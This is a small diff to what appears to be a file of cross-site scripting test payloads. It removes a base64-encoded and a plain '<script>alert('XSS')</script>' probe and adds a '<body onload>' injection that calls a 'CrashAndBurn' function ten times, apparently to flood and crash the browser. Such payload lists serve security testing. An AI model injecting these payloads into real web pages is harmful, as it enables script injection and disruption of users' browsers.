@@ -1,3 +1,1 @@
-IjxzY3JpcHQ+YWxlcnQoJ1hTUycpOzwvc2NyaXB0PiI7
-
-"<script>alert('XSS');</script>";
+<body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
